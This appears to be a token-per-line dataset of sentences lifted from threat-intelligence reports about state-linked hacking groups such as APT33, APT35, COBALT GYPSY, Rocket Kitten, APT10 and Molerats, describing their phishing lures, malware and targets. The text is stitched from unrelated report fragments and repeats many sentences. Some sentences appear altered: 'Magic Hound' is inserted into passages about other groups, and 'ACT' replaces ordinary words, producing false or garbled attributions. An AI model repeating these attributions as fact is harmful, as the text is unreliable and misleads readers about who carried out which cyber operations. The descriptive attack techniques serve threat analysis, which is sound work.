Saudi
Arabia
.
 
At
a
high
level
,
Retriever
is
a
.NET
downloader
that
downloads
secondary
payloads
from
servers
associated
with
Magic
Hound
.
 
For
example
,
we
analyzed
a
DropIt
sample
(
SHA256
:
cca268c13885ad5751eb70371bbc9ce8c8795654fedb90d9e3886cbcfe323671
)
that
dropped
two
executables
,
one
of
which
was
saved
to
"
%TEMP%\flash_update.exe
"
that
was
a
legitimate
Flash
Player
installer
.
 
M-Trends
2018
can
arm
security
teams
with
the
knowledge
they
need
to
defend
against
today
's
most
often
used
cyber
attacks
,
as
well
as
lesser
seen
and
emerging
threats
.
 
FireEye
tracks
thousands
of
threat
actors
,
but
pays
special
attention
to
state-sponsored
attackers
who
carry
out
advanced
persistent
threat
(
APT
)
attacks
.
 
Since
at
least
2014
,
APT32
,
also
known
as
the
OceanLotus
Group
,
has
targeted
foreign
corporations
with
investments
in
Vietnam
,
foreign
governments
,
journalists
,
and
Vietnamese
dissidents
.
 
During
a
recent
campaign
,
APT32
leveraged
social
engineering
emails
with
Microsoft
ActiveMime
file
attachments
to
deliver
malicious
macros
.
 
Evidence
also
suggests
that
APT32
has
targeted
network
security
and
technology
infrastructure
corporations
with
connections
to
foreign
investors
.
 
Since
at
least
2014
,
APT32
,
also
known
as
the
OceanLotus
Group
,
has
targeted
foreign
corporations
foreign
governments
.
 
FireEye
asesses
that
APT32
actors
may
be
aligned
with
the
national
interests
of
Vietnam
.
 
APT32
poses
a
threat
to
companies
doing
business
or
preparing
to
invest
in
Vietnam
.
 
We
believe
recent
activity
targeting
private
interests
in
Vietnam
suggests
that
APT32
poses
a
threat
to
companies
doing
business
or
preparing
to
invest
in
the
country
.
 
DROPSHOT
is
a
notable
piece
of
malware
used
to
deliver
variants
of
the
TURNEDUP
backdoor
.
 
Additionally
,
there
is
evidence
to
suggest
APT33
targeted
Saudi
Arabia
.
 
APT33
often
conducts
spear-phishing
operations
using
a
built-in
phishing
module
.
 
Additionally
,
there
is
evidence
to
suggest
APT33
targeted
Saudi
Arabian
and
Western
organizations
that
provide
training
,
maintenance
and
support
for
Saudi
Arabia
's
military
and
commercial
fleets
.
 
Although
we
have
only
observed
APT33
use
DROPSHOT
to
deliver
TURNEDUP
,
we
have
identified
multiple
DROPSHOT
samples
in
the
wild
that
delivered
wiper
malware
we
call
SHAPESHIFT
.
 
The
SHAPESHIFT
wiper
is
capable
of
wiping
disks
and
volumes
,
as
well
as
deleting
files
.
 
Ties
to
SHAPESHIFT
suggest
that
APT33
may
engage
in
destructive
operations
or
shares
tools
or
development
resources
with
an
Iranian
threat
group
that
conducts
destructive
operations
.
 
In
a
recent
attack
,
APT33
sent
spear-phishing
emails
to
workers
in
the
aviation
industry
.
 
The
HTA
files
contained
job
descriptions
and
links
to
job
postings
on
popular
employment
websites
.
 
Since
at
least
2014
,
an
Iranian
threat
group
tracked
by
FireEye
as
APT34
has
conducted
reconnaissance
aligned
with
the
strategic
interests
of
Iran
.
 
These
emails
included
recruitment-themed
lures
and
links
to
malicious
HTML
Application
files
.
 
The
OilRig
group
conducts
operations
primarily
in
the
Middle
East
,
targeting
financial
,
government
,
energy
,
chemical
,
telecommunications
and
other
industries
.
 
APT34
uses
a
mix
of
public
and
non-public
tools
.
 
APT34
often
uses
compromised
accounts
to
conduct
spear-phishing
operations
.
 
APT33
leverages
a
mix
of
public
and
non-public
tools
and
often
conducts
spear-phishing
operations
using
a
built-in
phishing
module
from
"
ALFA
TEaM
Shell
"
,
a
publicly
available
web
shell
.
 
In
July
2017
,
FireEye
observed
APT34
targeting
an
organization
in
the
Middle
East
using
the
POWRUNER
PowerShell-based
backdoor
and
the
downloader
BONDUPDATER
.
 
POWRUNER
was
delivered
using
a
malicious
RTF
file
that
exploited
CVE-2017-0199
.
 
In
November
2017
,
APT34
leveraged
the
Microsoft
Office
vulnerability
CVE-2017-11882
to
deploy
POWRUNER
and
BONDUPDATER
less
than
a
week
after
Microsoft
issued
a
patch
.
 
FireEye
has
identified
APT35
operations
dating
back
to
2014
.
 
APT35
,
also
known
as
the
Newscaster
Team
,
is
a
threat
group
sponsored
by
the
Iranian
government
that
conducts
long
term
,
resource-intensive
operations
to
collect
strategic
intelligence
.
 
APT35
typically
targets
military
,
diplomatic
and
government
,
media
,
energy
,
engineering
,
business
services
and
telecommunications
sectors
in
U.S.
and
the
Middle
East
.
 
APT35
has
historically
used
unsophisticated
tools
like
those
listed
below
in
Figure
3
.
 
APT35
typically
targets
U.S.
and
the
Middle
Eastern
military
,
diplomatic
and
government
personnel
,
organizations
in
the
media
,
energy
and
defense
industrial
base
(
DIB
)
,
and
engineering
,
business
services
and
telecommunications
sectors
.
 
Many
of
the
fake
personas
utilized
by
APT35
claimed
to
be
part
of
news
organizations
,
which
led
to
APT35
being
referred
to
as
the
Newscaster
Team
.
 
Since
at
least
2013
,
the
Iranian
threat
group
that
FireEye
tracks
as
APT33
has
carried
out
a
Cyber
Espionage
operation
to
collect
information
from
defense
,
aerospace
and
petrochemical
organizations
.
 
Since
at
least
2013
,
the
Iranian
threat
group
FireEye
tracks
as
APT33
has
carried
out
a
Cyber
Espionage
operation
to
collect
information
from
defense
,
aerospace
and
petrochemical
organizations
.
 
In
early
2017
,
Mandiant
responded
to
an
incident
involving
APT35
targeting
an
energy
company
.
 
The
attacker
used
a
spear-phishing
email
containing
a
link
to
a
fake
resume
hosted
on
a
legitimate
website
that
had
been
compromised
.
 
APT35
also
installed
BROKEYOLK
,
a
custom
backdoor
,
to
maintain
persistence
on
the
compromised
host
.
 
They
then
proceeded
to
log
directly
into
the
VPN
using
the
credentials
of
the
compromised
user
.
 
The
resume
contained
the
PupyRAT
backdoor
,
which
communicated
with
known
APT35
infrastructure
.
 
Once
connected
to
the
VPN
,
APT35
focused
on
stealing
domain
credentials
from
a
Microsoft
Active
Directory
Domain
Controller
to
allow
them
to
authenticate
to
the
single-factor
VPN
and
Office
365
instance
.
 
While
having
access
to
the
organization
's
environment
,
the
Magic
Hound
targeted
data
related
to
entities
in
the
Middle
East
.
 
Mandiant
has
previously
observed
targeted
attackers
stealing
email
,
but
few
threat
actors
have
been
as
successful
at
this
as
APT35
.
 
The
campaigns
delivered
PupyRAT
,
an
open-source
cross-platform
remote
access
trojan
(
RAT
)
.
 
Ultimately
,
APT35
had
used
access
to
hundreds
of
mailboxes
to
read
email
communications
and
steal
data
related
to
Middle
East
organizations
,
which
later
became
victims
of
destructive
attacks
.
 
CTU
researchers
observed
likely
unsuccessful
phishing
campaigns
being
followed
by
highly
targeted
spearphishing
and
social
engineering
attacks
from
a
threat
actor
using
the
name
Mia
Ash
.
 
Further
analysis
revealed
a
well-established
collection
of
fake
social
media
profiles
that
appear
intended
to
build
trust
and
rapport
with
potential
victims
.
 
COBALT
GYPSY
has
used
spearphishing
to
target
telecommunications
,
government
,
defense
,
oil
,
and
financial
services
organizations
based
in
or
affiliated
with
the
MENA
region
,
identifying
individual
victims
through
social
media
sites
.
 
The
connections
associated
with
these
profiles
indicate
the
threat
actor
began
using
the
persona
to
target
organizations
in
April
2016
.
 
Between
December
28
,
2016
and
January
1
,
2017
,
CTU
researchers
observed
a
phishing
campaign
targeting
Middle
Eastern
organizations
.
 
The
macro
ran
a
PowerShell
command
that
attempted
to
download
additional
PowerShell
loader
scripts
for
PupyRAT
,
a
research
and
penetration-testing
tool
that
has
been
used
in
attacks
.
 
The
survey
contained
macros
that
,
once
enabled
,
downloaded
PupyRAT
.
 
CTU
researchers
determined
that
the
COBALT
GYPSY
threat
group
orchestrated
this
activity
due
to
the
tools
,
techniques
,
and
procedures
(
TTPs
)
used
in
both
campaigns
.
 
The
Magic
Hound
has
repeatedly
used
social
media
to
identify
and
interact
with
employees
at
targeted
organizations
and
then
used
weaponized
Excel
documents
.
 
The
group
has
repeatedly
used
social
media
,
particularly
LinkedIn
,
to
identify
and
interact
with
employees
at
targeted
organizations
,
and
then
used
weaponized
Excel
documents
to
deliver
RATs
such
as
PupyRAT
.
 
By
compromising
a
user
account
that
has
administrative
or
elevated
access
,
Magic
Hound
can
quickly
access
a
targeted
environment
to
achieve
their
objectives
.
 
These
characteristics
suggest
that
COBALT
GYPSY
executed
the
January
and
February
phishing
campaigns
and
that
it
created
the
Mia
Ash
persona
.
 
CTU
researchers
have
observed
multiple
COBALT
GYPSY
campaigns
since
2015
and
consider
it
highly
likely
that
the
group
is
associated
with
Iranian
government-directed
cyber
operations
.
 
The
use
of
the
Mia
Ash
persona
demonstrates
the
creativity
and
persistence
that
threat
actors
employ
to
compromise
targets
.
 
CTU
researchers
conclude
that
COBALT
GYPSY
created
the
persona
to
gain
unauthorized
access
to
targeted
computer
networks
via
social
engineering
.
 
The
persistent
use
of
social
media
to
identify
and
manipulate
victims
indicates
that
COBALT
GYPSY
successfully
achieves
its
objectives
using
this
tactic
.
 
COBALT
GYPSY
's
continued
social
media
use
reinforces
the
importance
of
recurring
social
engineering
training
.
 
SecureWorks
Counter
Threat
Unit
(
CTU
)
researchers
analyzed
a
phishing
campaign
that
targeted
a
Middle
Eastern
organization
in
early
January
2017
.
 
SecureWorks
Counter
Threat
Unit
(
CTU
)
researchers
analyzed
a
phishing
campaign
that
targeted
a
Middle
Eastern
organization
in
early
January
2017
.
 
CTU
analysis
suggests
this
activity
is
related
to
Iranian
threat
actors
closely
aligned
with
or
acting
on
behalf
of
the
COBALT
GYPSY
threat
group
(
formerly
labeled
Threat
Group-2889
)
.
 
Since
early
2014
,
an
attacker
group
of
Iranian
origin
has
been
actively
targeting
persons
of
interest
by
means
of
malware
infection
,
supported
by
persistent
spear
phishing
campaigns
.
 
This
cyber-espionage
group
was
dubbed
'
Rocket
Kitten
'
,
and
remains
active
as
of
this
writing
,
with
reported
attacks
as
recent
as
October
2015
.
 
Characterized
by
relatively
unsophisticated
technical
merit
and
extensive
use
of
spear
phishing
,
the
Magic
Hound
targeted
individuals
and
organizations
in
the
Middle
East
(
including
targets
inside
Iran
itself
)
,
as
well
as
across
Europe
and
in
the
United
States
.
 
The
May
2014
'
Operation
Saffron
Rose
'
publication
identifies
an
Iranian
hacking
group
formerly
named
'
Ajax
Security
'
(
code-named
'
Flying
Kitten
'
by
CrowdStrike
)
engaged
in
active
spear
phishing
attacks
on
Iranian
dissidents
(
those
attempting
to
circumvent
government
traffic
monitoring
)
.
 
An
Iranian
hacking
group
formerly
named
Ajax
Security
(
code-named
'
Flying
Kitten
'
by
CrowdStrike
)
engaged
in
active
spear
phishing
attacks
on
Iranian
dissidents
(
those
attempting
to
circumvent
government
traffic
monitoring
)
.
 
The
report
specifies
the
Magic
Hound
targeted
political
,
military
and
defense
industry
in
the
US
,
UK
and
Israel
.
 
ClearSky
's
September
2014
blog
post
first
described
active
attacks
using
a
piece
of
malware
they
dubbed
'
Gholee
'
(
as
appears
in
a
malicious
payload
export
function
,
potentially
named
after
a
popular
Iranian
singer9
)
.
 
The
Rocket
Kitten
attacker
group
's
main
attack
vector
is
spear-phishing
.
 
After
learning
of
an
active
attack
incident
from
the
Rocket
Kitten
group
on
a
customer
network
,
Check
Point
researchers
decided
to
actively
join
the
investigation
.
 
As
described
in
previous
publications
,
the
Rocket
Kitten
attackers
make
extensive
use
of
various
phishing
schemes
.
 
While
the
recent
paper
from
Trend
Micro
and
ClearSky
(
'
The
Spy
Kittens
Are
Back
:
Rocket
Kitten
2
'
)
does
extensively
cover
the
campaign
's
narrative
,
we
aimed
to
seek
confirmation
that
our
analyzed
attack
was
positively
connected
to
the
same
campaign
and
set
out
to
provide
additional
value
and
insight
.
 
As
the
Rocket
Kitten
group
's
behavior
was
well
characterized
in
previous
publications
(
see
the
recent
report
from
Trend
Micro
and
ClearSky
)
.
 
Magic
Hound
will
often
find
simpler
ACTs
for
effective
compromise
,
such
as
creative
phishing
and
simple
custom
malware
.
 
We
present
the
connection
between
Behzad
Mesri
,
an
Iranian
national
recently
indicted
for
his
involvement
in
hacking
HBO
,
and
Charming
Kitten
.
 
Sometimes
,
they
aim
at
establishing
a
foothold
on
the
target
's
computer
to
gain
access
into
their
organization
,
but
,
based
on
our
data
,
this
is
usually
not
their
main
objective
,
as
opposed
to
other
Iranian
threat
groups
,
such
as
Oilrig1
and
CopyKittens2
.
 
A
case
of
these
obscure
lines
can
be
found
in
a
blogpost
published
in
coordination
and
parallel
to
this
report
-
"
Flying
Kitten
to
Rocket
Kitten
,
A
Case
of
Ambiguity
and
Shared
Code
"
3
by
Collin
Anderson
and
Claudio
Guarnieri
.
 
FireEye
's
publication
of
"
Operation
Saffron
Rose
"
report
,
which
described
Flying
Kitten
's
operations
against
aviation
firms
,
led
to
the
dismantling
of
Flying
Kitten
's
infrastructure
and
the
apparent
end
of
its
activities
.
 
To
sum
up
,
the
HBO
hacker
-
Behzad
Mesri
is
a
member
of
Turk
Black
Hat
along
with
ArYaIeIrAn
,
who
provides
infrastructure
for
Charming
Kitten
activity
via
PersianDNS
/
Mahanserver
together
with
Mohammad
Rasoul
Akbari
,
who
is
a
Facebook
friend
of
Behzad
Mesri
's
.
 
Charming
kitten
regularly
target
international
media
outlets
with
Persian-language
services
.
 
It
was
a
decoy
to
make
visitor
download
a
"
Flash
Player
"
,
which
was
in
fact
DownPaper
malware
,
analyzed
later
in
this
report
.
 
In
addition
to
using
PlugX
and
Poison
Ivy
(
PIVY
)
,
both
known
to
be
used
by
the
group
,
they
also
used
a
new
Trojan
called
"
ChChes
"
by
the
Japan
Computer
Emergency
Response
Team
Coordination
Center
(
JPCERT
)
.
 
Wapack
labs
also
observed
a
similar
sample
targeting
Japan
in
November
.
 
MenuPass
spoofed
several
sender
email
addresses
to
send
spear
phishing
emails
,
most
notably
public
addresses
associated
with
the
Sasakawa
Peace
Foundation
and
The
White
House
.
 
menuPass
typically
makes
use
of
a
mix
of
DDNS
and
actor-registered
domains
in
their
attack
campaigns
.
 
There
is
not
much
public
information
about
the
APT
campaign
called
menuPass
(
also
known
as
Stone
Panda
and
APT10
)
.
 
A
paper
from
FireEye
in
2013
on
several
campaigns
using
PIVY
included
menuPass
as
one
of
them
.
 
Believed
to
have
started
activity
in
2009
and
to
originate
from
China
,
the
group
initially
was
known
for
targeting
US
and
overseas
defense
contractors
but
broadened
their
targeting
as
time
passed
.
 
menuPass
has
targeted
individuals
and
organizations
in
Japan
since
at
least
2014
,
and
as
the
same
organizations
and
academics
were
largely
targeted
each
month
in
these
attacks
,
it
further
shows
menuPass
is
persistent
in
attempts
to
compromise
their
targets
.
 
menuPass
also
heavily
favors
spear
phishing
,
and
so
takes
steps
to
socially
engineer
their
spear
phishes
for
maximum
appearance
of
legitimacy
.
 
menuPass
is
an
ongoing
APT
campaign
with
a
broad
range
of
targets
and
will
likely
continue
to
target
Japan
in
the
future
.
 
ChopShop1
is
a
new
framework
developed
by
the
MITRE
Corporation
for
network-based
protocol
decoders
that
enable
security
professionals
to
understand
actual
commands
issued
by
human
operators
controlling
endpoints
.
 
PyCommands
,
meanwhile
,
are
Python
scripts
that
automate
tasks
for
Immunity
Debugger
,
a
popular
tool
for
reverse-engineering
malware
binaries
.
 
Poison
Ivy
is
a
remote
access
tool
that
is
freely
available
for
download
from
its
official
web
site
at
www.poisonivy-rat.com
.
 
First
released
in
2005
,
the
tool
has
gone
unchanged
since
2008
with
v
ersion
2.3.2
.
 
Poison
Ivy
includes
features
common
to
most
Windows-based
RATs
,
including
key
logging
,
screen
capturing
,
video
capturing
,
file
transfers
,
system
administration
,
password
theft
,
and
traffic
relaying
.
 
APT40
was
previously
reported
as
TEMP.Periscope
and
TEMP.Jumper
.
 
They
move
laterally
and
escalate
system
privileges
to
extract
sensitive
information
whenever
the
attacker
wants
to
do
so.4
,5
Because
some
RATs
used
in
targeted
attacks
are
widely
available
,
determining
whether
an
attack
is
part
of
a
broader
APT
campaign
can
be
difficult
.
 
In
2011
,
three
years
after
the
most
recent
release
of
PIVY
,
attackers
used
the
RAT
to
compromise
security
firm
RSA
and
steal
data
about
its
SecureID
authentication
system
.
 
PIVY
also
played
a
key
role
in
the
2011
campaign
known
as
Nitro
that
targeted
chemical
makers
,
government
agencies
,
defense
contractors
,
and
human
rights
groups.10,11
Still
active
a
year
later
,
the
Nitro
attackers
used
a
zero-day
vulnerability
in
Java
to
deploy
PIVY
in
2012
.
 
Just
recently
,
PIVY
was
the
payload
of
a
zero-day
exploit
in
Internet
Explorer
used
in
what
is
known
as
a
"
strategic
web
compromise
"
attack
against
visitors
to
a
U.S.
government
website
and
a
variety
of
others
.
 
The
Poison
Ivy
builder
kit
allows
attackers
to
customize
and
build
their
own
PIVY
server
,
which
is
delivered
as
mobile
code
to
a
target
that
has
been
compromised
,
typically
using
social
engineering
.
 
Attackers
can
point
and
click
their
ACT
through
a
compromised
network
and
exfiltrate
data
.
 
Commodity
RATs
also
complicate
efforts
by
security
professionals
to
correlate
a
threat
actor
's
activity
over
timeattackers
can
hide
in
the
sea
of
malicious
activity
that
also
uses
Poison
Ivy-based
malware
.
 
This
report
is
an
initial
public
release
of
research
PwC
UK
and
BAE
Systems
have
conducted
into
new
,
sustained
global
campaigns
by
an
established
threat
actor
against
managed
IT
service
providers
and
their
clients
as
well
as
several
directly
targeted
organisations
in
Japan
.
 
Since
late
2016
,
PwC
UK
and
BAE
Systems
have
been
assisting
victims
of
a
new
cyber
espionage
campaign
conducted
by
APT10
.
 
The
campaign
,
which
we
refer
to
as
Operation
Cloud
Hopper
,
has
targeted
managed
IT
service
providers
(
MSPs
)
,
allowing
APT10
unprecedented
potential
access
to
the
intellectual
property
and
sensitive
data
of
those
MSPs
and
their
clients
globally
.
 
APT10
ceased
its
use
of
the
Poison
Ivy
malware
family
after
a
2013
FireEye
report
,
which
comprehensively
detailed
the
malware
's
functionality
and
features
,
and
its
use
by
several
China-based
threat
actors
,
including
APT10
.
 
APT10
primarily
used
PlugX
malware
from
2014
to
2016
,
progressively
improving
and
deploying
newer
versions
,
while
simultaneously
standardising
their
command
and
control
function
.
 
PwC
UK
and
BAE
Systems
assess
it
is
highly
likely
that
APT10
is
a
China-based
threat
actor
with
a
focus
on
espionage
and
wide
ranging
information
collection
.
 
APT10
is
known
to
have
exfiltrated
a
high
volume
of
data
from
multiple
victims
,
exploiting
compromised
MSP
networks
,
and
those
of
their
customers
,
to
stealthily
move
this
data
around
the
world
.
 
APT10
,
a
name
originally
coined
by
FireEye
,
is
also
referred
to
as
Red
Apollo
by
PwC
UK
,
CVNX
by
BAE
Systems
,
Stone
Panda
by
CrowdStrike
,
and
menuPass
Team
more
broadly
in
the
public
domain
.
 
The
threat
actor
has
previously
been
the
subject
of
a
range
of
open
source
reporting
,
including
most
notably
a
report
by
FireEye
comprehensively
detailing
the
threat
actor
's
use
of
the
Poison
Ivy
malware
family
and
blog
posts
by
Trend
Micro3
similarly
detailing
the
use
of
EvilGrab
malware
.
 
The
threat
actor
has
previously
been
the
subject
of
a
range
of
open
source
reporting
,
including
most
notably
a
report
by
FireEye
comprehensively
detailing
the
threat
actor
's
use
of
the
Poison
Ivy
malware
family
and
blog
posts
by
Trend
Micro
similarly
detailing
the
use
of
EvilGrab
malware
.
 
APT10
has
been
in
operation
since
at
least
2009
,
and
has
evolved
its
targeting
from
an
early
focus
on
the
US
defence
industrial
base
(
DIB
)1
and
the
technology
and
telecommunications
sector
,
to
a
widespread
compromise
of
multiple
industries
and
sectors
across
the
globe
,
most
recently
with
a
focus
on
MSPs
.
 
The
research
and
ongoing
tracking
of
APT10
by
both
PwC
UK
and
BAE
.
 
APT10
has
been
in
operation
since
at
least
2009
,
and
has
evolved
its
targeting
from
an
early
focus
on
the
US
defence
industrial
base
(
DIB
)
and
the
technology
and
telecommunications
sector
,
to
a
widespread
compromise
of
multiple
industries
and
sectors
across
the
globe
,
most
recently
with
a
focus
on
MSPs
.
 
PwC
UK
has
been
engaged
in
supporting
investigations
linked
to
APT10
compromises
.
 
As
a
result
of
our
analysis
of
APT10
's
activities
,
we
believe
that
it
almost
certainly
benefits
from
significant
staffing
and
logistical
resources
,
which
have
increased
over
the
last
three
years
,
with
a
significant
step-change
in
2016
.
 
Due
to
the
scale
of
the
threat
actor
's
operations
throughout
2016
and
2017
,
we
similarly
assess
it
currently
comprises
multiple
teams
,
each
responsible
for
a
different
section
of
the
day-to-day
operations
,
namely
domain
registration
,
infrastructure
management
,
malware
development
,
target
operations
,
and
analysis
.
 
APT10
withdrew
from
direct
targeting
using
Poison
Ivy
in
2013
and
conducted
its
first
known
retooling
operation
,
upgrading
its
capabilities
and
replatforming
to
use
PlugX
.
 
It
is
highly
likely
that
this
is
due
to
the
release
of
the
2013
FireEye
report
.
 
Our
report
will
detail
the
most
recent
campaigns
conducted
by
APT10
,
including
the
sustained
targeting
of
MSPs
,
which
we
have
named
Operation
Cloud
Hopper
,
and
the
targeting
of
a
number
of
Japanese
institutions
.
 
MSPs
therefore
represent
a
high-payoff
target
for
espionagefocused
threat
actors
such
as
APT10
.
 
Given
the
level
of
client
network
access
MSPs
have
,
once
APT10
has
gained
access
to
a
MSP
,
it
is
likely
to
be
relatively
straightforward
to
exploit
this
and
move
laterally
onto
the
networks
of
potentially
thousands
of
other
victims
.
 
This
,
in
turn
,
would
provide
access
to
a
larger
amount
of
intellectual
property
and
sensitive
data
.
 
APT10
has
been
observed
to
exfiltrate
stolen
intellectual
property
via
the
MSPs
,
hence
evading
local
network
defences
.
 
The
command
and
control
(
C2
)
infrastructure
chosen
by
APT10
for
Operation
Cloud
Hopper
is
predominantly
referenced
using
dynamic-DNS
domains
.
 
Several
of
these
provide
enterprise
services
or
cloud
hosting
,
supporting
our
assessment
that
APT10
are
almost
certainly
targeting
MSPs
.
 
The
13th
FYP
was
released
in
March
2016
and
the
sectors
and
organisations
known
to
be
targeted
by
APT10
are
broadly
in
line
with
the
strategic
aims
documented
in
this
plan
.
 
These
aims
outlined
in
the
FYP
will
largely
dictate
the
growth
of
businesses
in
China
and
are
,
therefore
,
likely
to
also
form
part
of
Chinese
companies
'
business
strategies
.
 
APT10
has
,
in
the
past
,
primarily
been
known
for
its
targeting
of
government
and
US
defence
industrial
base
organisations
,
with
the
earliest
known
date
of
its
activity
being
in
December
2009
.
 
Observed
APT10
targeting
is
in
line
with
many
of
the
historic
compromises
we
have
outlined
previously
as
originating
from
China
.
 
In
line
with
commonly
used
APT
actor
methodologies
,
the
threat
actor
aligns
its
decoy
documents
to
a
topic
of
interest
relevant
to
the
recipient
.
 
This
section
details
changes
made
to
APT10
tools
,
techniques
and
procedures
(
TTPs
)
post-2014
,
following
its
shift
from
Poison
Ivy
to
PlugX
.
 
We
have
observed
that
in
cases
where
APT10
has
infiltrated
a
target
via
an
MSP
,
it
continues
to
use
the
MSPs
credentials
.
 
In
order
to
gain
any
further
credentials
,
APT10
will
usually
deploy
credential
theft
tools
such
as
mimikatz
or
PwDump
,
sometimes
using
DLL
load
order
hijacking
,
to
use
against
a
domain
controller
,
explained
further
in
Annex
B
.
 
APT10
achieves
persistence
on
its
targets
primarily
by
using
scheduled
tasks
or
Windows
services
in
order
to
ensure
the
malware
remains
active
regardless
of
system
reboots
.
 
For
example
,
in
addition
to
compromising
high
value
domain
controllers
and
security
servers
,
the
threat
actor
has
also
been
observed
identifying
and
subsequently
installing
malware
on
low
profile
systems
that
provide
non-critical
support
functions
to
the
business
,
and
are
thus
less
likely
to
draw
the
attention
of
system
administrators
.
 
In
the
majority
of
instances
APT10
used
either
a
reverse
shell
or
RDP
connection
to
install
its
malware
;
the
actor
also
uses
these
methods
to
propagate
across
the
network
.
 
The
tactical
malware
,
historically
EvilGrab
,
and
now
ChChes
(
and
likely
also
RedLeaves
)
,
is
designed
to
be
lightweight
and
disposable
,
often
being
delivered
through
spear
phishing
.
 
Once
executed
,
tactical
malware
contains
the
capability
to
profile
the
network
and
manoeuvre
through
it
to
identify
a
key
system
of
interest
.
 
We
have
also
observed
APT10
use
DLL
search
order
hijacking
and
sideloading
,
to
execute
some
modified
versions
of
open-source
tools
.
 
For
example
,
PwC
UK
has
observed
APT10
compiling
DLLs
out
of
tools
,
such
as
Mimikatz
and
PwDump6
,
and
using
legitimate
,
signed
software
,
such
as
Windows
Defender
to
load
the
malicious
payloads
.
 
During
our
analysis
of
victim
networks
,
we
were
able
to
observe
APT10
once
again
initiate
a
retooling
cycle
in
late
2016
.
 
We
observed
the
deployment
and
testing
of
multiple
versions
of
Quasar
malware
,
and
the
introduction
of
the
bespoke
malware
families
ChChes
and
RedLeaves
.
 
APT10
is
a
constantly
evolving
,
highly
persistent
China-based
threat
actor
that
has
an
ambitious
and
unprecedented
collection
programme
against
a
broad
spectrum
of
sectors
,
enabled
by
its
strategic
targeting
.
 
Since
exposure
of
its
operations
in
2013
,
APT10
has
made
a
number
of
significant
changes
intended
to
thwart
detection
of
its
campaigns
.
 
PwC
UK
and
BAE
Systems
,
working
closely
with
industry
and
government
,
have
uncovered
a
new
,
unparallelled
campaign
which
we
refer
to
as
Operation
Cloud
Hopper
.
 
This
operation
has
targeted
managed
IT
service
providers
,
the
compromise
of
which
provides
APT10
with
potential
access
to
thousands
of
further
victims
.
 
An
additional
campaign
has
also
been
observed
targeting
Japanese
entities
.
 
APT10
's
malware
toolbox
shows
a
clear
evolution
from
malware
commonly
associated
with
China-based
threat
actors
towards
bespoke
in-house
malware
that
has
been
used
in
more
recent
campaigns
;
this
is
indicative
of
APT10
's
increasing
sophistication
,
which
is
highly
likely
to
continue
.
 
The
threat
actor
's
known
working
hours
align
to
Chinese
Standard
TIME
(
CST
)
and
its
targeting
corresponds
to
that
of
other
known
China-based
threat
actors
,
which
supports
our
assessment
that
these
campaigns
are
conducted
by
APT10
.
 
APT10
(
MenuPass
Group
)
is
a
Chinese
cyber
espionage
group
that
FireEye
has
tracked
since
2009
.
 
Its
targets
include
the
military
organizations
and
governments
of
countries
with
national
interests
in
the
South
China
Sea
,
including
some
within
the
U.S.
defense
industrial
base
.
 
Moafee
may
have
chosen
its
targets
based
on
the
rich
resources
of
South
China
Sea
region
the
world
's
second
business
sea-lane
,
according
to
Wikipedia
including
rare
earth
metals
,
crude
oil
,
and
natural
gas
.
 
DragonOK
appears
to
operate
out
of
China
's
Jiangsu
Province
.
 
Moafee
and
DragonOK
both
use
a
well-known
proxy
tool
HUC
Packet
Transmit
MAL
(
HTRAN
)
to
disguise
their
geographical
locations
.
 
However
,
FireEye
researchers
do
not
have
enough
insight
to
reliably
report
a
definitive
connection
to
the
Moafee
and
DragonOK
groups
.
 
Both
Moafee
and
DragonOK
favor
spear-phishing
emails
as
an
attack
vector
,
often
employing
a
decoy
to
deceive
the
victim
.
 
Attachments
are
typically
sent
as
an
executable
file
embedded
in
a
ZIP
archive
or
a
password-protected
Microsoft
Office
document
.
 
We
observed
Moafee
running
HTRAN
proxies
on
their
multiple
Command
and
Control
(
C2
)
servers
all
operated
on
CHINANET
,
and
hosted
in
Guangdong
Province
.
 
Like
the
Moafee
group
,
we
observed
DragonOK
running
HTRAN
to
proxy
their
C2
servers
,
which
are
also
operated
on
CHINANET
but
are
hosted
in
the
Jiangsu
Province
.
 
Primarily
focused
on
governments
and
military
operations
of
countries
with
interests
in
the
South
China
Sea
,
Moafee
likely
chooses
its
targets
based
on
region
's
rich
natural
resources
.
 
By
targeting
high-tech
and
manufacturing
operations
in
Japan
and
Taiwan
,
DragonOK
may
be
acquiring
trade
secrets
for
a
competitive
economic
advantage
.
 
Security
researchers
subsequently
linked
these
attacks
to
a
broader
,
yearlong
campaign
that
targeted
not
just
Israelis
but
Palestinians
as
well
.
 
and
as
discovered
later
,
even
the
U.S.
and
UK
governments
.
 
The
second
group
,
known
as
DragonOK
,
targets
high-tech
and
manufacturing
companies
in
Japan
and
Taiwan
.
 
In
2012
,
the
Molerats
attacks
appeared
to
rely
heavily
on
the
XtremeRAT
,
a
freely
available
tool
that
is
popular
with
attackers
based
in
the
Middle
East
.
 
But
the
group
has
also
used
Poison
Ivy
(
PIVY
)
,
a
RAT
more
commonly
associated
with
threat
actors
in
China
so
much
so
that
PIVY
has
,
inaccurately
,
become
synonymous
with
all
APT
attacks
linked
to
China
.
 
This
blog
post
analyzes
several
recent
Molerats
attacks
that
deployed
PIVY
against
targets
in
the
Middle
East
and
in
the
U.S.
We
also
examine
additional
PIVY
attacks
that
leverage
Arabic-language
content
related
to
the
ongoing
crisis
in
Egypt
and
the
wider
Middle
East
to
lure
targets
into
opening
malicious
files
.
 
We
do
not
know
whether
using
PIVY
is
an
attempt
by
those
behind
the
Molerats
campaign
to
frame
China-based
threat
actors
for
their
attacks
or
simply
evidence
that
they
have
added
another
effective
,
publicly-available
RAT
to
its
arsenal
.
 
We
observed
several
attacks
in
June
and
July
2013
against
targets
in
the
Middle
East
and
the
U.S.
that
dropped
a
PIVY
payload
that
connected
to
command-and-control
(
CnC
)
infrastructure
used
by
the
Molerats
attackers
.
 
The
archive
contains
an
.exe
file
,
sometimes
disguised
as
a
Microsoft
Word
file
,
a
video
,
or
another
file
format
,
using
the
corresponding
icon
.
 
In
addition
to
DustySky
,
the
attackers
use
publicly
available
tools
such
as
the
following
Remote
Administration
Tools
(
RAT
)
:
Poison
Ivy
,
Nano
Core
,
XtremeRAT
,
DarkComet
and
Spy-Net
.
 
DustySky
(
called
"
NeD
Worm
"
by
its
developer
)
is
a
multi-stage
malware
in
use
since
May
2015
.
 
It
is
in
use
by
the
Molerats
(
aka
Gaza
cybergang
)
,
a
politically
motivated
group
whose
main
objective
,
we
believe
,
is
intelligence
gathering
.
 
Operating
since
2012
,
the
Molerats
group
's
activity
has
been
reported
by
Norman
,
Kaspersky
,
FireEye
,
and
PwC
.
 
DustySky
has
been
developed
and
used
since
May
2015
by
Molerats
(
aka
"
Gaza
cybergang
"
)
,
a
terrorist
group
whose
main
objective
in
this
campaign
is
